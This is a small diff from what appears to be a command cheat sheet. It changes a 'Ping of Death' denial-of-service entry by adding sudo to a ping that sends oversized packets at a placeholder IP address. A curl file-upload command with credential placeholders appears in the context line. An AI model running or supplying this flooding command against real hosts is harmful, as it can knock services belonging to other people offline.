@@ -60,4 +60,4 @@ curl -k -T ARQUIVO_LOCAL -u "ID_DA_PASTA:SENHA_DE_USUÁRIO" -H 'X-Requested-With
 
 ## DOS with Ping (Ping of Death
 
-ping <ip address> -s 65500 -t 1 -n 1
+sudo ping <ip address> -s 65500 -t 1 -n 1
